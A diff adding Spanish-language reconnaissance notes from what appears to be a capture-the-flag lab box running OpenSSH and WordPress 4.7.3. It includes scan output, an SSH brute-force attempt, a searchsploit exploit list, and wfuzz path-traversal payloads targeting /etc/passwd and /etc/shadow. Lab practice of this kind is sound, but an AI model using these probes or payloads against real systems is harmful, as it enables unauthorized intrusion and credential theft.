@@ -1,0 +1,992 @@
+		Temten 10.10.10.10
+
++++++ INFORMACION ENTREGADA ++++++++++++++++++++++++++++++++++++++
+	Nombre:  Temten
+	Sistema Operativo: Linux
+	Dificultad: Medio
+	IP: 10.10.10.10
+
+
+-- PUERTOS:
+
+	nmap -sC -sV -A -O -p22,80 10.10.10.10
+
+	PORT   STATE SERVICE VERSION
+	22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+	| ssh-hostkey: 
+	|   2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA)
+	|   256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA)
+	|_  256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (ED25519)
+	80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+	|_http-generator: WordPress 4.7.3
+	|_http-server-header: Apache/2.4.18 (Ubuntu)
+	|_http-title: Job Portal &#8211; Just another WordPress site
+	Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+	Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%), Linux 4.4 (92%), Linux 3.16 (90%)
+	No exact OS matches for host (test conditions non-ideal).
+	Network Distance: 2 hops
+	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+	nmap -sU -sC -sV -p20,80 10.10.10.10
+	
+	22/udp closed ssh
+	80/udp closed http
+
+----- RESUMEN DE LA INFORMACION OBTENIDA ---------------------------
+
+	PORT 		PROTOCOLO	SERVICIO	VERSION 
+
+	22/tcp    	open  		sh    	OpenSSH 7.2p2 Ubuntu 4ubuntu2.1
+	80/tcp   	open  		http   	Apache httpd 2.4.18 ((Ubuntu))
+
+
++++++ FASE DE ANALISIS DE VULNERABILIDADES +++++++++++++++++++++
+
+
+----- SSH: Por el puerto 22, Version OpenSSH 7.2p2 ---------------------------
+
+-- Aplicacion ssh con script.
+
+	PORT   STATE SERVICE
+	22/tcp open  ssh
+	| ssh-auth-methods: 
+	|   Supported authentication methods: 
+	|     publickey
+	|_    password
+	| ssh-brute: 
+	|   Accounts: No valid accounts found
+	|_  Statistics: Performed 1594 guesses in 600 seconds, average tps: 2.6
+	| ssh-hostkey: 
+	|   2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA)
+	|   256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA)
+	|_  256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (ED25519)
+	| ssh-publickey-acceptance: 
+	|_  Accepted Public Keys: No public keys accepted
+	|_ssh-run: Failed to specify credentials and command to run.
+	| ssh2-enum-algos: 
+	|   kex_algorithms: (6)
+	|       curve25519-sha256@libssh.org
+	|       ecdh-sha2-nistp256
+	|       ecdh-sha2-nistp384
+	|       ecdh-sha2-nistp521
+	|       diffie-hellman-group-exchange-sha256
+	|       diffie-hellman-group14-sha1
+	|   server_host_key_algorithms: (5)
+	|       ssh-rsa
+	|       rsa-sha2-512
+	|       rsa-sha2-256
+	|       ecdsa-sha2-nistp256
+	|       ssh-ed25519
+	|   encryption_algorithms: (6)
+	|       chacha20-poly1305@openssh.com
+	|       aes128-ctr
+	|       aes192-ctr
+	|       aes256-ctr
+	|       aes128-gcm@openssh.com
+	|       aes256-gcm@openssh.com
+	|   mac_algorithms: (10)
+	|       umac-64-etm@openssh.com
+	|       umac-128-etm@openssh.com
+	|       hmac-sha2-256-etm@openssh.com
+	|       hmac-sha2-512-etm@openssh.com
+	|       hmac-sha1-etm@openssh.com
+	|       umac-64@openssh.com
+	|       umac-128@openssh.com
+	|       hmac-sha2-256
+	|       hmac-sha2-512
+	|       hmac-sha1
+	|   compression_algorithms: (2)
+	|       none
+	|_      zlib@openssh.com
+
+-- Probar de password por defecto.
+
+	ssh root@10.10.10.10
+	The authenticity of host '10.10.10.10 (10.10.10.10)' can't be established.
+	ECDSA key fingerprint is SHA256:AxKIYOMkqGk3v+ZKgHEM6QcEDw8c8/qi1l0CMNSx8uQ.
+	Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+	Warning: Permanently added '10.10.10.10' (ECDSA) to the list of known hosts.
+	root@10.10.10.10's password: 
+	Permission denied, please try again.
+	root@10.10.10.10's password: 
+	Permission denied, please try again.
+	root@10.10.10.10's password: 
+	root@10.10.10.10: Permission denied (publickey,password).
+
+-- Aplicacion netcat.
+
+	nc -vn 10.10.10.10 22
+	(UNKNOWN) [10.10.10.10] 22 (ssh) open
+	SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.1
+
+-- Aplicacion searchsploit  
+
+	searchsploit openssh 7.2
+	-------------------------------------------------------------------------------------------------- ---------------------------------
+	 Exploit Title                                                                                    |  Path
+	-------------------------------------------------------------------------------------------------- ---------------------------------
+	OpenSSH 2.3 < 7.7 - Username Enumeration                                                          | linux/remote/45233.py
+	OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                    | linux/remote/45210.py
+	OpenSSH 7.2 - Denial of Service                                                                   | linux/dos/40888.py
+	OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                           | multiple/remote/39569.py
+	OpenSSH 7.2p2 - Username Enumeration                                                              | linux/remote/40136.py
+	OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalat | linux/local/40962.txt
+	OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                          | linux/remote/40963.txt
+	OpenSSH < 7.7 - User Enumeration (2)                                                              | linux/remote/45939.py
+	OpenSSHd 7.2p2 - Username Enumeration                                                             | linux/remote/40113.txt
+	-------------------------------------------------------------------------------------------------- ---------------------------------	
+
+	No son válidos.
+
+
+----- HTTP: Por el puerto 80 Version  Apache httpd 2.4.18 ---------------------------
+
+-- Aplicacion ssh con script.
+
+	PORT   STATE SERVICE
+	80/tcp open  http
+	| http-auth-finder: 
+	| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.10                                                        
+	|   url                                 method                                                                                     
+	|_  http://10.10.10.10:80/wp-login.php  FORM                                                                                       
+	|_http-backup-finder: ERROR: Script execution failed (use -d to debug)                                                             
+	| http-brute:                                                                                                                      
+	|_  Path "/" does not require authentication                                                                                       
+	|_http-chrono: Request times for /; avg: 397.21ms; min: 316.09ms; max: 490.35ms                                                    
+	| http-comments-displayer:                                                                                                         
+	| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.10 
+	 Path: http://10.10.10.10:80/wp-login.php  
+	 Path: http://10.10.10.10:80/wp-content/themes/twentyseventeen/style.css?ver=4.7.3   
+	_http-date: Sun, 17 May 2020 17:20:26 GMT; 0s from local time.
+	|_http-devframework: Wordpress detected. Found common traces on /
+	|_http-dombased-xss: Couldn't find any DOM based XSS.
+	| http-enum: 
+	|   /wp-login.php: Possible admin folder
+	|   /readme.html: Wordpress version: 2 
+	|   /: WordPress version: 4.7.3
+	|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
+	|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
+	|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
+	|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
+	|   /wp-login.php: Wordpress login page.
+	|   /wp-admin/upgrade.php: Wordpress login page.
+	|_  /readme.html: WordPress version 4.7
+	| http-errors: 
+	| Spidering limited to: maxpagecount=40; withinhost=10.10.10.10
+	|   Found the following error pages: 
+	|_http-feed: ERROR: Script execution failed (use -d to debug)
+	|_http-fetch: Please enter the complete path of the directory to save data in.
+	|_http-generator: WordPress 4.7.3
+	| http-grep: 
+	|   (1) http://10.10.10.10:80/: 
+	|     (1) ip: 
+	|       + 10.10.10.10
+	|   (1) http://10.10.10.10:80/index.php/feed/: 
+	|     (1) ip: 
+	|_      + 10.10.10.108
+	| http-headers: 
+	|   Date: Sun, 17 May 2020 17:20:26 GMT
+	|   Server: Apache/2.4.18 (Ubuntu)
+	|   Link: <http://10.10.10.10/index.php/wp-json/>; rel="https://api.w.org/"
+	|   Connection: close
+	|   Content-Type: text/html; charset=UTF-8
+	|   
+	|_  (Request type: HEAD)
+	|_http-malware-host: Host appears to be clean
+	| http-methods: 
+	|_  Supported Methods: GET HEAD POST OPTIONS
+	|_http-mobileversion-checker: No mobile version detected.
+	|_http-referer-checker: Couldn't find any cross-domain scripts.
+	|_http-security-headers: 
+	|_http-server-header: Apache/2.4.18 (Ubuntu)
+	| http-sitemap-generator: 
+	|   Directory structure:
+	|     /
+	|       Other: 1; php: 2
+	|     /index.php/2017/04/
+	|       Other: 1
+	|     /index.php/category/uncategorized/
+	|       Other: 1
+	|     /index.php/comments/feed/
+	|       Other: 1
+	|     /index.php/feed/
+	|       Other: 1
+	|     /index.php/jobs/
+	|       Other: 1
+	|     /index.php/wp-json/
+	|       Other: 1
+	|     /wp-content/themes/twentyseventeen/
+	|       css: 1
+	|     /wp-includes/
+	|       xml: 1
+	|     /wp-includes/js/
+	|       js: 1
+	|     /wp-includes/js/jquery/
+	|       js: 2
+	|   Longest directory structure:
+	|     Depth: 3
+	|     Dir: /wp-includes/js/jquery/
+	|   Total files found (by extension):
+	|_    Other: 7; css: 1; js: 3; php: 2; xml: 1
+	|_http-slowloris: false
+	| http-slowloris-check: 
+	|   VULNERABLE:
+	|   Slowloris DOS attack
+	|     State: LIKELY VULNERABLE
+	|     IDs:  CVE:CVE-2007-6750
+	|       Slowloris tries to keep many connections to the target web server open and hold
+	|       them open as long as possible.  It accomplishes this by opening connections to
+	|       the target web server and sending a partial request. By doing so, it starves
+	|       the http server's resources causing Denial Of Service.
+	|       
+	|     Disclosure date: 2009-09-17
+	|     References:
+	|       http://ha.ckers.org/slowloris/
+	|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
+	|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+	|_http-title: Job Portal &#8211; Just another WordPress site
+	| http-traceroute: 
+	|_  Possible reverse proxy detected.
+	| http-useragent-tester: 
+	|   Status for browser useragent: 200
+	|   Allowed User Agents: 
+	|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
+	|     libwww
+	|     lwp-trivial
+	|     libcurl-agent/1.0
+	|     PHP/
+	|     Python-urllib/2.5
+	|     GT::WWW
+	|     Snoopy
+	|     MFC_Tear_Sample
+	|     HTTP::Lite
+	|     PHPCrawl
+	|     URI::Fetch
+	|     Zend_Http_Client
+	|     http client
+	|     PECL::HTTP
+	|     Wget/1.13.4 (linux-gnu)
+	|_    WWW-Mechanize/1.34
+	| http-vhosts: 
+	|_127 names had status 200
+	| http-wordpress-brute: 
+	|   Accounts: No valid accounts found
+	|_  Statistics: Performed 0 guesses in 1 seconds, average tps: 0.0
+	| http-wordpress-enum: 
+	| Search limited to top 100 themes/plugins
+	|   plugins
+	|     akismet 3.3
+	|   themes
+	|     twentyfifteen 1.7
+	|     twentysixteen 1.3
+	|_    twentyseventeen 1.1
+	| http-wordpress-users: 
+	| Username found: takis
+	|_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-users.limit'
+	|_http-xssed: No previously reported XSS vuln.
+
+-- Aplicación whatweb
+
+	whatweb 10.10.10.10
+	http://10.10.10.10 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)],
+	IP[10.10.10.10], JQuery[1.12.4], MetaGenerator[WordPress 4.7.3], PoweredBy[HTTPServer,WordPress,], 
+	Script[text/javascript], Title[Job Portal &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[4.7.3] 
+
+-- Aplicación Nikto.
+
+	- Nikto v2.1.6
+	---------------------------------------------------------------------------
+	+ Target IP:          10.10.10.10
+	+ Target Hostname:    10.10.10.10
+	+ Target Port:        80
+	+ Start Time:         2020-05-17 13:32:35 (GMT-4)
+	---------------------------------------------------------------------------
+	+ Server: Apache/2.4.18 (Ubuntu)
+	+ The anti-clickjacking X-Frame-Options header is not present.
+	+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+	+ Uncommon header 'link' found, with contents: <http://10.10.10.10/index.php/wp-json/>; rel="https://api.w.org/"
+	+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fa
+	shion to the MIME type
+	+ No CGI Directories found (use '-C all' to force check all possible dirs)
+	+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+	+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+	+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for d
+	etails.
+	+ OSVDB-3093: /.bashrc: User home dir was found with a shell rc file. This may reveal file and path information.
+	+ OSVDB-3093: /.profile: User home dir with a shell profile was found. May reveal directory information and system configuration.
+	+ OSVDB-3233: /icons/README: Apache default file found.
+	+ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version
+	+ /readme.html: This WordPress file reveals the installed version.
+	+ /wp-links-opml.php: This WordPress script reveals the installed version.
+	+ OSVDB-3092: /license.txt: License file found may identify site software.
+	+ /: A Wordpress installation was found.
+	+ Cookie wordpress_test_cookie created without the httponly flag
+	+ /wp-login.php: Wordpress login found
+	+ 7837 requests: 0 error(s) and 17 item(s) reported on remote host
+	+ End Time:           2020-05-17 13:38:19 (GMT-4) (344 seconds)
+
+-- Aplicacion wfuzz
+
+	********************************************************
+	* Wfuzz 2.4.5 - The Web Fuzzer                         *
+	********************************************************
+
+	Target: http://10.10.10.10/FUZZ
+	Total requests: 468
+
+	===================================================================
+	ID           Response   Lines    Word     Chars       Payload                                                           
+	===================================================================
+
+	000000039:   400        10 L     35 W     303 Ch      "\nnetstat -a%\n"                                                 
+	000000062:   400        10 L     35 W     303 Ch      "ABCD|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|
+														  "                                                                 
+	000000064:   400        10 L     35 W     303 Ch      "../../../../../../../../../../../../etc/hosts"                   
+	000000065:   400        10 L     35 W     303 Ch      "../../boot.ini"                                                  
+	000000070:   400        10 L     35 W     303 Ch      "../../../../../../../../../../../../etc/shadow"                  
+	000000073:   400        10 L     35 W     303 Ch      "/../../../../../../../../../../etc/passwd"                       
+	000000068:   400        10 L     35 W     303 Ch      "../../../../../../../../../../../../etc/passwd"                  
+	000000074:   400        10 L     35 W     303 Ch      "/../../../../../../../../../../etc/shadow"                       
+	000000071:   400        10 L     35 W     303 Ch      "/../../../../../../../../../../etc/passwd^^"                     
+	000000072:   400        10 L     35 W     303 Ch      "/../../../../../../../../../../etc/shadow^^"                     
+	000000056:   200        328 L    3654 W   54026 Ch    "?x=|"                                                            
+	000000057:   200        328 L    3654 W   54026 Ch    "?x=>"                                                            
+	000000055:   200        328 L    3654 W   54026 Ch    "?x=""                                                            
+	000000054:   200        328 L    3654 W   54026 Ch    "?x="                                                             
+	000000096:   404        9 L      32 W     318 Ch      "/../../../../../../../../../../../etc/passwd%00.html" 
+
+-- Aplicacion Uniscan
+
+	# uniscan -u 10.10.10.10 -qweds
+	####################################
+	# Uniscan project                  #
+	# http://uniscan.sourceforge.net/  #
+	####################################
+	V. 6.3
+
+	Scan date: 17-5-2020 13:48:49
+	===================================================================================================
+	| Domain: http://10.10.10.10/
+	| Server: Apache/2.4.18 (Ubuntu)
+	| IP: 10.10.10.10
+	===================================================================================================
+	|
+	| Directory check:
+	| [+] CODE: 200 URL: http://10.10.10.10/wp-admin/
+	===================================================================================================
+	|                                                                                                   
+	| File check:
+	| [+] CODE: 200 URL: http://10.10.10.10/.bashrc
+	| [+] CODE: 200 URL: http://10.10.10.10/index.php
+	| [+] CODE: 200 URL: http://10.10.10.10/license.txt
+	| [+] CODE: 200 URL: http://10.10.10.10/.profile
+	| [+] CODE: 200 URL: http://10.10.10.10/readme.html
+	| [+] CODE: 200 URL: http://10.10.10.10/wp-content/plugins/akismet/readme.txt
+	===================================================================================================
+	|
+	| Check robots.txt:
+	|
+	| Check sitemap.xml:
+	===================================================================================================
+	|
+	| Crawler Started:
+	| Plugin name: External Host Detect v.1.2 Loaded.
+	| Plugin name: Timthumb <= 1.32 vulnerability v.1 Loaded.
+	| Plugin name: Upload Form Detect v.1.1 Loaded.
+	| Plugin name: E-mail Detection v.1.1 Loaded.
+	| Plugin name: phpinfo() Disclosure v.1 Loaded.
+	| Plugin name: Code Disclosure v.1.1 Loaded.
+	| Plugin name: FCKeditor upload test v.1 Loaded.
+	| Plugin name: Web Backdoor Disclosure v.1.1 Loaded.
+	| [+] Crawling finished, 63 URL's found!
+	|
+	| External hosts:
+	| [+] External Host Found: https://gravatar.com
+	| [+] External Host Found: https://wordpress.org
+	| [+] External Host Found: https://developer.wordpress.org
+	| [+] External Host Found: https://httpd.apache.org
+	| [+] External Host Found: https://secure.php.net
+	| [+] External Host Found: http://gmpg.org
+	| [+] External Host Found: https://codex.wordpress.org
+	| [+] External Host Found: https://planet.wordpress.org
+	| [+] External Host Found: https://www.mysql.com
+	| [+] External Host Found: https://&quot;gravatar.com&quot;&gt;Gravatar&lt;
+	|
+	| Timthumb:
+	|
+	| File Upload Forms:
+	|
+	| E-mails:
+	| [+] E-mail Found: m@tidakada.com
+	|
+	| PHPinfo() Disclosure:
+	|
+	| Source Code Disclosure:
+	|
+	| FCKeditor File Upload:
+	|
+	| Web Backdoors:
+	|
+	| Ignored Files: 
+	| http://10.10.10.10/wp-includes/js/comment-reply.min.js?ver=4.7.3
+	| http://10.10.10.10/wp-content/themes/twentyseventeen/assets/js/html5.js?ver=3.7.3
+	| http://10.10.10.10/wp-content/themes/twentyseventeen/assets/js/navigation.js?ver=1.0
+	| http://10.10.10.10/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1
+	| http://10.10.10.10/wp-includes/js/wp-embed.min.js?ver=4.7.3
+	| http://10.10.10.10/wp-content/themes/twentyseventeen/assets/css/ie8.css?ver=1.0
+	| http://10.10.10.10/wp-content/themes/twentyseventeen/assets/js/global.js?ver=1.0
+	| http://10.10.10.10/wp-admin/css/install.css?ver=20100228
+	| http://10.10.10.10/wp-includes/css/dashicons.min.css?ver=4.7.3
+	| http://10.10.10.10/wp-content/themes/twentyseventeen/assets/js/jquery.scrollTo.js?ver=2.1.2
+	| http://10.10.10.10/wp-content/plugins/job-manager/css/display.css?ver=0.7.25
+	| http://10.10.10.10/wp-includes/js/jquery/ui/datepicker.min.js?ver=1.11.4
+	| http://10.10.10.10/wp-content/plugins/job-manager/js/display.js?ver=0.7.25
+	| http://10.10.10.10/wp-includes/js/jquery/ui/core.min.js?ver=1.11.4
+	| http://10.10.10.10/wp-includes/css/buttons.min.css?ver=4.7.3
+	| http://10.10.10.10/wp-content/themes/twentyseventeen/assets/js/skip-link-focus-fix.js?ver=1.0
+	| http://10.10.10.10/wp-content/themes/twentyseventeen/style.css?ver=4.7.3
+	| http://10.10.10.10/wp-admin/css/ie.min.css?ver=4.7.3
+	| http://10.10.10.10/wp-includes/js/jquery/jquery.js?ver=1.12.4
+	| http://10.10.10.10/wp-includes/wlwmanifest.xml
+	| http://10.10.10.10/wp-admin/css/install.min.css?ver=4.7.3
+	===================================================================================================
+	| Dynamic tests:
+	| Plugin name: Learning New Directories v.1.2 Loaded.
+	| Plugin name: FCKedior tests v.1.1 Loaded.
+	| Plugin name: Timthumb <= 1.32 vulnerability v.1 Loaded.
+	| Plugin name: Find Backup Files v.1.2 Loaded.
+	| Plugin name: Blind SQL-injection tests v.1.3 Loaded.
+	| Plugin name: Local File Include tests v.1.1 Loaded.
+	| Plugin name: PHP CGI Argument Injection v.1.1 Loaded.
+	| Plugin name: Remote Command Execution tests v.1.1 Loaded.
+	| Plugin name: Remote File Include tests v.1.2 Loaded.
+	| Plugin name: SQL-injection tests v.1.2 Loaded.
+	| Plugin name: Cross-Site Scripting tests v.1.2 Loaded.
+	| Plugin name: Web Shell Finder v.1.3 Loaded.
+	| [+] 3 New directories added
+	|                                                                                                   
+	| FCKeditor tests:
+	|                                                                                                   
+	| Timthumb < 1.33 vulnerability:
+	|                                                                                                   
+	| Backup Files:
+	|                                                                                                   
+	| Blind SQL Injection:
+	|                                                                                                   
+	| Local File Include:
+	|                                                                                                   
+	| PHP CGI Argument Injection:
+		|                                                                                                   
+	| Remote Command Execution:
+	|                                                                                                   
+	| Remote File Include:
+		|                                                                                                   
+	| SQL Injection:
+	|                                                                                                   
+	| Cross-Site Scripting (XSS):
+	|                                                                                                   
+	| Web Shell Finder:
+	===================================================================================================
+	| Static tests:
+	| Plugin name: Local File Include tests v.1.1 Loaded.
+	| Plugin name: Remote Command Execution tests v.1.1 Loaded.
+	| Plugin name: Remote File Include tests v.1.1 Loaded.
+	|                                                                                                   
+	| Local File Include:
+	|                                                                                                   
+	| Remote Command Execution:
+	|                                                                                                   
+	| Remote File Include:
+	===================================================================================================
+	Scan end date: 17-5-2020 13:52:28
+
+	HTML report saved in: report/10.10.10.10.html
+
+-- Aplicacion dirb:
+
+	dirb http://10.10.10.10:80/
+
+	-----------------
+	DIRB v2.22    
+	By The Dark Raver
+	-----------------
+
+	START_TIME: Mon May 18 05:18:40 2020
+	URL_BASE: http://10.10.10.10:80/
+	WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------
+	-----------------
+	GENERATED WORDS: 4612                                                          
+
+	---- Scanning URL: http://10.10.10.10:80/ ----
+	+ http://10.10.10.10:80/.bashrc (CODE:200|SIZE:3771)                                                                               
+	==> DIRECTORY: http://10.10.10.10:80/.cache/                                                                                       
+	+ http://10.10.10.10:80/.profile (CODE:200|SIZE:655)                                                                               
+	+ http://10.10.10.10:80/index.php (CODE:301|SIZE:0)                                                                                
+	+ http://10.10.10.10:80/server-status (CODE:403|SIZE:299)                                                                          
+	==> DIRECTORY: http://10.10.10.10:80/wp-admin/                                                                                     
+	==> DIRECTORY: http://10.10.10.10:80/wp-content/                                                                                   
+	==> DIRECTORY: http://10.10.10.10:80/wp-includes/                                                                                  
+	+ http://10.10.10.10:80/xmlrpc.php (CODE:405|SIZE:42)
+	---- Entering directory: http://10.10.10.10:80/.cache/ ----
+	---- Entering directory: http://10.10.10.10:80/wp-admin/ ----
+	+ http://10.10.10.10:80/wp-admin/admin.php (CODE:302|SIZE:0)                                                                       
+	==> DIRECTORY: http://10.10.10.10:80/wp-admin/css/                                                                                 
+	==> DIRECTORY: http://10.10.10.10:80/wp-admin/images/                                                                              
+	==> DIRECTORY: http://10.10.10.10:80/wp-admin/includes/                                                                            
+	+ http://10.10.10.10:80/wp-admin/index.php (CODE:302|SIZE:0)                                                                       
+	==> DIRECTORY: http://10.10.10.10:80/wp-admin/js/                                                                                  
+	==> DIRECTORY: http://10.10.10.10:80/wp-admin/maint/                                                                               
+	==> DIRECTORY: http://10.10.10.10:80/wp-admin/network/                                                                             
+	==> DIRECTORY: http://10.10.10.10:80/wp-admin/user/  
+	---- Entering directory: http://10.10.10.10:80/wp-content/ ----
+	+ http://10.10.10.10:80/wp-content/index.php (CODE:200|SIZE:0)                                                                     
+	==> DIRECTORY: http://10.10.10.10:80/wp-content/plugins/                                                                           
+	==> DIRECTORY: http://10.10.10.10:80/wp-content/themes/                                                                            
+	==> DIRECTORY: http://10.10.10.10:80/wp-content/upgrade/                                                                           
+	==> DIRECTORY: http://10.10.10.10:80/wp-content/uploads/
+	---- Entering directory: http://10.10.10.10:80/wp-includes/ ----
+	==> DIRECTORY: http://10.10.10.10:80/wp-includes/certificates/                                                                     
+	==> DIRECTORY: http://10.10.10.10:80/wp-includes/css/                                                                              
+	==> DIRECTORY: http://10.10.10.10:80/wp-includes/customize/                                                                        
+	==> DIRECTORY: http://10.10.10.10:80/wp-includes/fonts/                                                                            
+	==> DIRECTORY: http://10.10.10.10:80/wp-includes/images/                                                                           
+	==> DIRECTORY: http://10.10.10.10:80/wp-includes/js/                                                                               
+	==> DIRECTORY: http://10.10.10.10:80/wp-includes/widgets/
+	---- Entering directory: http://10.10.10.10:80/wp-admin/css/ ----
+	---- Entering directory: http://10.10.10.10:80/wp-admin/images/ ----
+	---- Entering directory: http://10.10.10.10:80/wp-admin/includes/ ----
+	+ http://10.10.10.10:80/wp-admin/includes/admin.php (CODE:500|SIZE:0) 
+	---- Entering directory: http://10.10.10.10:80/wp-admin/js/ ----
+	---- Entering directory: http://10.10.10.10:80/wp-admin/maint/ ----
+	---- Entering directory: http://10.10.10.10:80/wp-admin/network/ ----
+	+ http://10.10.10.10:80/wp-admin/network/admin.php (CODE:302|SIZE:0)                                                               
+	+ http://10.10.10.10:80/wp-admin/network/index.php (CODE:302|SIZE:0)  
+	---- Entering directory: http://10.10.10.10:80/wp-admin/user/ ----
+	+ http://10.10.10.10:80/wp-admin/user/admin.php (CODE:302|SIZE:0)                                                                  
+	+ http://10.10.10.10:80/wp-admin/user/index.php (CODE:302|SIZE:0)  
+	---- Entering directory: http://10.10.10.10:80/wp-content/plugins/ ----
+	+ http://10.10.10.10:80/wp-content/plugins/index.php (CODE:200|SIZE:0) 
+	---- Entering directory: http://10.10.10.10:80/wp-content/themes/ ----
+	+ http://10.10.10.10:80/wp-content/themes/index.php (CODE:200|SIZE:0) 
+	---- Entering directory: http://10.10.10.10:80/wp-content/upgrade/ ----
+	---- Entering directory: http://10.10.10.10:80/wp-content/uploads/ ----
+	---- Entering directory: http://10.10.10.10:80/wp-includes/certificates/ ----
+	---- Entering directory: http://10.10.10.10:80/wp-includes/css/ ----
+	---- Entering directory: http://10.10.10.10:80/wp-includes/customize/ ----
+	---- Entering directory: http://10.10.10.10:80/wp-includes/fonts/ ----
+	---- Entering directory: http://10.10.10.10:80/wp-includes/images/ ----
+	==> DIRECTORY: http://10.10.10.10:80/wp-includes/images/media/                                                                     
+	==> DIRECTORY: http://10.10.10.10:80/wp-includes/images/smilies/ 
+	---- Entering directory: http://10.10.10.10:80/wp-includes/js/ ----
+	==> DIRECTORY: http://10.10.10.10:80/wp-includes/js/jquery/                                                                        
+	+ http://10.10.10.10:80/wp-includes/js/swfobject.js (CODE:200|SIZE:10231)                                                          
+	==> DIRECTORY: http://10.10.10.10:80/wp-includes/js/thickbox/                                                                      
+	==> DIRECTORY: http://10.10.10.10:80/wp-includes/js/tinymce/
+	---- Entering directory: http://10.10.10.10:80/wp-includes/widgets/ ----
+	---- Entering directory: http://10.10.10.10:80/wp-includes/images/media/ ----
+	---- Entering directory: http://10.10.10.10:80/wp-includes/images/smilies/ ----
+	---- Entering directory: http://10.10.10.10:80/wp-includes/js/jquery/ ----
+	==> DIRECTORY: http://10.10.10.10:80/wp-includes/js/jquery/ui/ 
+	---- Entering directory: http://10.10.10.10:80/wp-includes/js/thickbox/ ----
+	---- Entering directory: http://10.10.10.10:80/wp-includes/js/tinymce/ ----
+	==> DIRECTORY: http://10.10.10.10:80/wp-includes/js/tinymce/langs/                                                                 
+	==> DIRECTORY: http://10.10.10.10:80/wp-includes/js/tinymce/plugins/                                                               
+	==> DIRECTORY: http://10.10.10.10:80/wp-includes/js/tinymce/skins/                                                                 
+	==> DIRECTORY: http://10.10.10.10:80/wp-includes/js/tinymce/themes/                                                                
+	==> DIRECTORY: http://10.10.10.10:80/wp-includes/js/tinymce/utils/ 
+	---- Entering directory: http://10.10.10.10:80/wp-includes/js/jquery/ui/ ----
+	---- Entering directory: http://10.10.10.10:80/wp-includes/js/tinymce/langs/ ----
+	---- Entering directory: http://10.10.10.10:80/wp-includes/js/tinymce/plugins/ ----
+	==> DIRECTORY: http://10.10.10.10:80/wp-includes/js/tinymce/plugins/hr/                                                            
+	==> DIRECTORY: http://10.10.10.10:80/wp-includes/js/tinymce/plugins/image/                                                         
+	==> DIRECTORY: http://10.10.10.10:80/wp-includes/js/tinymce/plugins/lists/                                                         
+	==> DIRECTORY: http://10.10.10.10:80/wp-includes/js/tinymce/plugins/media/                                                         
+	==> DIRECTORY: http://10.10.10.10:80/wp-includes/js/tinymce/plugins/wordpress/  
+	---- Entering directory: http://10.10.10.10:80/wp-includes/js/tinymce/skins/ ----
+	==> DIRECTORY: http://10.10.10.10:80/wp-includes/js/tinymce/skins/wordpress/ 
+	---- Entering directory: http://10.10.10.10:80/wp-includes/js/tinymce/themes/ ----
+	---- Entering directory: http://10.10.10.10:80/wp-includes/js/tinymce/utils/ ----
+	---- Entering directory: http://10.10.10.10:80/wp-includes/js/tinymce/plugins/hr/ ----
+	---- Entering directory: http://10.10.10.10:80/wp-includes/js/tinymce/plugins/image/ ----
+	---- Entering directory: http://10.10.10.10:80/wp-includes/js/tinymce/plugins/lists/ ----																																	   
+	---- Entering directory: http://10.10.10.10:80/wp-includes/js/tinymce/plugins/media/ ----
+	---- Entering directory: http://10.10.10.10:80/wp-includes/js/tinymce/plugins/wordpress/ ----
+	---- Entering directory: http://10.10.10.10:80/wp-includes/js/tinymce/skins/wordpress/ ----
+	==> DIRECTORY: http://10.10.10.10:80/wp-includes/js/tinymce/skins/wordpress/images/
+	---- Entering directory: http://10.10.10.10:80/wp-includes/js/tinymce/skins/wordpress/images/ ----  -----------------
+	END_TIME: Mon May 18 07:29:17 2020
+	DOWNLOADED: 189092 - FOUND: 16
+
+
+-- Aplicacion wpscan.
+
+	wpscan --update
+
